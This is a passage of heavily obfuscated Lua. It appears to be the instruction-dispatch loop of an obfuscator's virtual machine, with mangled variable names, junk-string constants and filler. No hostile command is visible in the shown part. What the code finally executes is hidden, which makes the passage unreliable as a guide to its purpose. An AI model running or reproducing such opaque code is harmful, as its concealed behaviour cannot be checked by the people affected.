111";}]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Fs")];ajefa_IllIllll=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("tti")]];ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1]=ajefa_IllIllll;ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("DsJa")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("sT")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1])ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Oj")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("Iil")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("t8")]]=#ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Sen")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("8e")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("305")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("H8")];ajefa_lIIIIIlIllIlllllllIIll=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]ajefa_lIIIllIlIIIIIllIlII=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+2];if(ajefa_lIIIllIlIIIIIllIlII>0)then if(ajefa_lIIIIIlIllIlllllllIIll>ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{467;845;921;829};"1 + 1 = 111";}];else ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+3]=ajefa_lIIIIIlIllIlllllllIIll;end elseif(ajefa_lIIIIIlIllIlllllllIIll<ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+1])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("SEI")];else ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll+3]=ajefa_lIIIIIlIllIlllllllIIll;end end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("drTSF7eEe11d3ZQrJYSHEbNYBBGHVo349W1fSBZMIOWr7iaSOb4s4UCbO5qdBISZ")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("6eh7KKh9f9Zov1sBY3TtLapt0CXjVka57tbe3UdCWsYUMWrd8NNP9Fv6YXhiW8")then local ajefa_IIIlIllIllllIIllIlllIIll;local ajefa_IllIllll;local ajefa_lIIIIIlIllIlllllllIIll;ajefa_lIIIIIlIllIlllllllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Xq")]ajefa_lIlllIll[ajefa_lIIIIIlIllIlllllllIIll]=ajefa_lIlllIll[ajefa_lIIIIIlIllIlllllllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_lIIIIIlIllIlllllllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("N9p")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("A1")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("ZTl")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("uu8t")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("9u")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("f5F")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Y2")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("ISs")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IllIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("M6N")];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lIlllIll[ajefa_IllIllll]for ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_IllIllll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("l6JJ")]do ajefa_IIIlIllIllllIIllIlllIIll=ajefa_IIIlIllIllllIIllIlllIIll..ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll];end;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("fl")]]=ajefa_IIIlIllIllllIIllIlllIIll;ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("NC")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("K7p")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("3nLy")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("guT")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("9m1y")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Ck")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("vML")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("vp")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("WbY")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IllIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("3aN")];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lIlllIll[ajefa_IllIllll]for ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_IllIllll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("dI93")]do ajefa_IIIlIllIllllIIllIlllIIll=ajefa_IIIlIllIllllIIllIlllIIll..ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll];end;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sG")]]=ajefa_IIIlIllIllllIIllIlllIIll;elseif ajefa_IIIlIllIllllIIllIlllIIll>#("583rc0oHdZrIsmFRdjTliIv6C7fpfM4QYe3WSEpnUfKZS7dTtge9cXfyN70eU8B")then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("l3")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("3TI")]]+ajefa_lllIIlIllIlIllllIIlIIlll[#("qWHu")];else local ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("2A")]ajefa_lIlllIll[ajefa_IlIIIlIllIlIlllIlIlIllll]=ajefa_lIlllIll[ajefa_IlIIIlIllIlIlllIlIlIllll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IlIIIlIllIlIlllIlIlIllll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("uvD")]))end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("5MUntT8J4FCc7GoE3v59I5Nb8FiVOkDVOi4fnZALhFeHudAgSxlzdC298SpYKm5Uc")then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("zf5")];elseif ajefa_IIIlIllIllllIIllIlllIIll==#("zZMiqd5u2d0fQ5fbdq9eSmp4hFKMa4KuFPPKFJghESKZi2ctSJjOV88lJSbVEtu7EG")then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ae")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("1pI")]];else ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Mt")]]=(ajefa_lllIIlIllIlIllllIIlIIlll[#("UCe")]~=0);end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("aqFHEk1K9NAVoCp3CV5KHQDaXIuNkxNvNrbdmbQE3y8Jj6WsnA3lI5duXFU5ZoAMadi7BmRBfCRjS4")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("0WczUEBXRnRpSqUOP7vJfXZ2bTCggo4N3N3jXZQiJpBUT68jvXclvuWd6kybbuRDsevexK1Z")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("n9ZxeieUsVtmSqI10mNBOgoJ7BPK4WV6m4iv6R2bsrTKxqKXXnHxnzNhVpzODFZG9xaYi")then if ajefa_IIIlIllIllllIIllIlllIIll>#("4juLivxPmR01WRpzSYqaLRrnIYCmL9qWPLsxbNprUfdRXMSiqKPmHhMn1gcu3jemBeml")then if(ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("q0")]]==ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("S5bU")]])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("9xh")];end;else local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Vn")]ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll](ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll+1])end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("2xfI9pFNLB6ft6aueoH8eG4K5yLb1pSzHUymJOH2hLqQgoKnd1xZQmuxDFMMPDWuSIIKIX")then local ajefa_lIIIIIlIllIlllllllIIll=ajefa_lllIlllllIIlI[ajefa_lllIIlIllIlIllllIIlIIlll[#("tPY")]];local ajefa_IlIIIlIIIIlIIlllI;local ajefa_IIIlIllIllllIIllIlllIIll={};ajefa_IlIIIlIIIIlIIlllI=ajefa_lIIllIIIIIllIlIlllllII({},{__index=function(ajefa_IlIIIlIllIlIlllIlIlIllll,ajefa_lllIIlIllIlIllllIIlIIlll)local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_IIIlIllIllllIIllIlllIIll[ajefa_lllIIlIllIlIllllIIlIIlll];return ajefa_lllIIlIllIlIllllIIlIIlll[1][ajefa_lllIIlIllIlIllllIIlIIlll[2]];end,__newindex=function(ajefa_lIlllIll,ajefa_lllIIlIllIlIllllIIlIIlll,ajefa_IlIIIlIllIlIlllIlIlIllll)local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_IIIlIllIllllIIllIlllIIll[ajefa_lllIIlIllIlIllllIIlIIlll]ajefa_lllIIlIllIlIllllIIlIIlll[1][ajefa_lllIIlIllIlIllllIIlIIlll[2]]=ajefa_IlIIIlIllIlIlllIlIlIllll;end;});for ajefa_IlIIllIIIl=1,ajefa_lllIIlIllIlIllllIIlIIlll[#("3f8v")]do ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];if ajefa_lllIIlIllIlIllllIIlIIlll[#("c")]==82 then ajefa_IIIlIllIllllIIllIlllIIll[ajefa_IlIIllIIIl-1]={ajefa_lIlllIll,ajefa_lllIIlIllIlIllllIIlIIlll[#("4Vn")]};else ajefa_IIIlIllIllllIIllIlllIIll[ajefa_IlIIllIIIl-1]={ajefa_IllIllll,ajefa_lllIIlIllIlIllllIIlIIlll[#("sOz")]};end;ajefa_IIIlIlIlIlIllIIllIIIIlII[#ajefa_IIIlIlIlIlIllIIllIIIIlII+1]=ajefa_IIIlIllIllllIIllIlllIIll;end;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("0u")]]=ajefa_lIIIllIlIIIIIllIlII(ajefa_lIIIIIlIllIlllllllIIll,ajefa_IlIIIlIIIIlIIlllI,ajefa_IlIIllIIIl);elseif ajefa_IIIlIllIllllIIllIlllIIll==#("ARO1DpoEQXx7a33StAbUeb5mOZ57JR9Pqf7hbv1hob6YrFVCZZokHcRyWCmOtq59XSR45VR")then local ajefa_IlIIllIIIl=ajefa_lllIIlIllIlIllllIIlIIlll[#("o4")];local ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("eIJe")];local ajefa_lIIllIlIIlllII=ajefa_IlIIllIIIl+2 local ajefa_IlIIllIIIl={ajefa_lIlllIll[ajefa_IlIIllIIIl](ajefa_lIlllIll[ajefa_IlIIllIIIl+1],ajefa_lIlllIll[ajefa_lIIllIlIIlllII])};for ajefa_lllIIlIllIlIllllIIlIIlll=1,ajefa_IIIlIllIllllIIllIlllIIll do ajefa_lIlllIll[ajefa_lIIllIlIIlllII+ajefa_lllIIlIllIlIllllIIlIIlll]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll];end;local ajefa_IlIIllIIIl=ajefa_IlIIllIIIl[1]if ajefa_IlIIllIIIl then ajefa_lIlllIll[ajefa_lIIllIlIIlllII]=ajefa_IlIIllIIIl ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("zrC")];else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;end;else local ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Gu")]local ajefa_IlIIllIIIl={ajefa_lIlllIll[ajefa_IlIIIlIllIlIlllIlIlIllll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IlIIIlIllIlIlllIlIlIllll+1,ajefa_lIIIIIlIllIlllllllIIll))};local ajefa_lIIllIlIIlllII=0;for ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_IlIIIlIllIlIlllIlIlIllll,ajefa_lllIIlIllIlIllllIIlIIlll[#{{605;418;586;960};{28;959;277;269};{264;81;718;170};{796;247;555;953};}]do ajefa_lIIllIlIIlllII=ajefa_lIIllIlIIlllII+1;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll]=ajefa_IlIIllIIIl[ajefa_lIIllIlIIlllII];end end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("I4Gcfh5idEiTCZhoyKvKjnX7f6aKY0GdhqMMGOrOGdKZhlH8KDHvAgYugI7igvtm8fMlnGSTrRd")then if ajefa_IIIlIllIllllIIllIlllIIll<=#{"1 + 1 = 111";{325;69;98;626};{538;750;583;527};{443;650;776;532};"1 + 1 = 111";{577;124;607;955};{59;846;232;949};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{166;81;594;467};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{174;793;744;731};{676;754;474;911};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{643;370;145;46};"1 + 1 = 111";{609;743;656;61};{394;531;89;806};"1 + 1 = 111";"1 + 1 = 111";{189;141;798;603};{526;584;250;706};{360;631;956;726};{940;909;249;154};{895;550;434;401};{535;555;644;257};{796;964;475;59};{99;744;959;68};{843;381;683;144};"1 + 1 = 111";{942;908;956;269};{881;926;683;293};{385;712;695;533};{26;724;23;110};"1 + 1 = 111";{546;311;502;982};{217;796;438;520};{954;821;987;247};"1 + 1 = 111";"1 + 1 = 111";{397;836;957;129};{654;182;641;842};{889;524;945;274};{146;517;182;696};{855;650;58;123};"1 + 1 = 111";"1 + 1 = 111";{951;830;884;280};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{20;189;255;783};"1 + 1 = 111";{31;365;650;194};"1 + 1 = 111";{973;571;961;946};"1 + 1 = 111";"1 + 1 = 111";{258;719;319;942};{673;239;105;535};{260;970;122;121};{628;740;614;358};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{392;774;214;67};{689;313;842;238};}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("1fz")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("qCkW")];elseif ajefa_IIIlIllIllllIIllIlllIIll==#("ZVEbL9MZeaW6JkvDa3SPXBxyUGN9xNExRQdLVgnvBC0LUhxWygxv6VPyzgrevMDCHzp2hUR4Qx")then local ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lllIIlIllIlIllllIIlIIlll[#("HQ")]ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll](ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll+1])else local ajefa_IIIlIllIllllIIllIlllIIll;local ajefa_IlIIllIIIl;ajefa_IlIIllIIIl=ajefa_lllIIlIllIlIllllIIlIIlll[#("bN")];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("QZ8")]];ajefa_lIlllIll[ajefa_IlIIllIIIl+1]=ajefa_IIIlIllIllllIIllIlllIIll;ajefa_lIlllIll[ajefa_IlIIllIIIl]=ajefa_IIIlIllIllllIIllIlllIIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Xuek")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("En")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("DiX")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IlIIllIIIl=ajefa_lllIIlIllIlIllllIIlIIlll[#("CM")]ajefa_lIlllIll[ajefa_IlIIllIIIl]=ajefa_lIlllIll[ajefa_IlIIllIIIl](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IlIIllIIIl+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("6i8")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Lb")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("LeO")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("zAnZ")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];if(ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Kl")]]==ajefa_lllIIlIllIlIllllIIlIIlll[#("7l1L")])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("H5T")];end;end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("vLVOMj0MpphA6bQmPZi9Y9ydu2EPNACQKHtWNDP5F9mlA9s1CIbfIxzvnRsUPl9ZXC0zR3JljmFY")then local ajefa_lIIllIlIIlllII=ajefa_lllIIlIllIlIllllIIlIIlll[#("1tE")];local ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lIlllIll[ajefa_lIIllIlIIlllII]for ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII+1,ajefa_lllIIlIllIlIllllIIlIIlll[#{{758;762;392;255};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]do ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll..ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll];end;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("HL")]]=ajefa_IlIIIlIllIlIlllIlIlIllll;elseif ajefa_IIIlIllIllllIIllIlllIIll==#("lOvJNnfyxhmi8J5j5psayz8i4kI805u2KKbd7kc84CBtNqTuOco7lYzXQmPDPhIBXuIzH2mUmug57")then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("0Rq")]];else local ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("c6")]ajefa_lIlllIll[ajefa_IlIIIlIllIlIlllIlIlIllll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IlIIIlIllIlIlllIlIlIllll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("asN")]))end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("GOBntXQyQWknxUGKsX39GrTuXV0FU0SD0bRbbCXUUAPWnsFCnNctb7in4gAJ7lNZdRyvdFJ19ipgN7gEqyqh")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("zB22Dg4boXJWZSG5jyTdkt3ScK796sJ4GbPpGDKzOZVvRtYoKJgaIdNfIk02i5f6nOqYcpzQXtAvIHbSW")then if ajefa_IIIlIllIllllIIllIlllIIll<=#("zxlJxDyKSvNRpTUZiccamujBmnNrHbihgAGTUPrYADIddfeRLTz8PWGemUviZgcQmFLZnbeEVoKTWfy")then local ajefa_lIIllIlIIlllII=ajefa_lllIIlIllIlIllllIIlIIlll[#("2x")]local ajefa_IlIIllIIIl={ajefa_lIlllIll[ajefa_lIIllIlIIlllII](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_lIIllIlIIlllII+1,ajefa_lIIIIIlIllIlllllllIIll))};local ajefa_IlIIIlIllIlIlllIlIlIllll=0;for ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII,ajefa_lllIIlIllIlIllllIIlIIlll[#("G95Z")]do ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll]=ajefa_IlIIllIIIl[ajefa_IlIIIlIllIlIlllIlIlIllll];end elseif ajefa_IIIlIllIllllIIllIlllIIll>#("j6QXNkCu4BGasi8tA21IFoEKP5nBlXsgxo82Apdcdp5WGekMpqs4oZM5DgiS6bjghzNdkf4kZZFosReK")then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]]=#ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("81X")]];else ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{847;948;771;529};{503;308;943;517};}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Rrd")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("E4UQ")]];end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("Lk4Ez2INdAsgufbgYOgBhCkxifAuxMWbI8u1oNTGfAgQLeETDhFc7iMjaIvtDmpCOqIxUk1l5KvRvEVdLQ")then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Kp")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("7WP")]];elseif ajefa_IIIlIllIllllIIllIlllIIll==#("ohUezvl1RrAd2kOctGg8rqsgyX5YGWrSWvau4mibJtk4GHDHRCBHFRJ8YNRMAyu49RqHjthhyfA8fzL0tzg")then if(ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sq")]]==ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("qUot")]])then ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;else ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_lllIIlIllIlIllllIIlIIlll[#("P2o")];end;else ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{741;796;160;716};"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("NWn")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("IbYB")]];end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#{"1 + 1 = 111";{529;713;125;180};"1 + 1 = 111";{511;454;853;239};{392;54;521;908};{273;575;492;784};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{51;363;737;315};"1 + 1 = 111";{973;49;632;910};{153;787;405;430};"1 + 1 = 111";{389;58;633;833};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{618;332;869;520};"1 + 1 = 111";{471;550;204;236};{608;348;499;299};"1 + 1 = 111";{799;45;547;998};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{375;318;204;935};"1 + 1 = 111";{587;95;928;29};{711;195;990;378};"1 + 1 = 111";{410;685;963;692};"1 + 1 = 111";"1 + 1 = 111";{765;261;563;744};{314;474;986;804};"1 + 1 = 111";{176;566;620;83};"1 + 1 = 111";"1 + 1 = 111";{885;877;302;614};{941;39;280;770};{99;761;145;140};{75;724;450;79};"1 + 1 = 111";{20;440;793;567};{109;765;723;27};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";{82;267;800;912};"1 + 1 = 111";"1 + 1 = 111";{748;157;36;781};{41;540;21;798};{593;220;523;499};"1 + 1 = 111";"1 + 1 = 111";{29;744;37;66};"1 + 1 = 111";"1 + 1 = 